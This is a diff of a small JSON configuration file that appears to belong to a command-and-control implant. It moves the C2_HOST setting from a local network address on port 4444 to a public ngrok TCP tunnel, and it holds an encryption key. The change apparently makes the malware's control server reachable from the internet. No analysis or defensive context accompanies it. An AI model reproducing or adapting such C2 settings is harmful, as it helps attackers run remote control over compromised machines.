@@ -1,5 +1,5 @@
 {
-    "C2_HOST": "192.168.0.218",
-    "C2_PORT": 4444,
+    "C2_HOST": "0.tcp.ap.ngrok.io",
+    "C2_PORT": 25230,
     "ENCRYPTION_KEY": "E2p2NI5-ffLV6QvSLMyohCwYIWcF9My-L_jUmd0Cyq4="
 }
